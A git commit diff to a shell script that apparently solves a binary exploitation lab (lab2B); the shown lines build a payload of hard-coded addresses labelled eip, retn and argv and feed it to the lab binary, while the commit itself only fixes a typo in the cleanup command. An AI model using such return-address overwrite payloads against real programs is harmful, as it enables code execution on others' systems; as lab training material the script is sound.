d60e4f9f508fa6501837754745fb5a6be5c1cfd7
ngovinhhuy <31349426+ngovinhhuy@users.noreply.github.com>
2021-10-12 23:34:45 +0700

    Update 2B_solution.sh

--- lab2/2B_solution.sh
+++ lab2/2B_solution.sh
@@ -5,4 +5,4 @@ echo -en "\xbd\x86\x04\x08" >>/tmp/outfile #eip
 echo -en "\x38\x87\x04\x08" >>/tmp/outfile #retn
 echo -en "\xd0\x87\x04\x08" >>/tmp/outfile #argv
 /levels/lab02/lab2B $(cat /tmp/outfile)
-rm -f /tmp/outfil
+rm -f /tmp/outfile
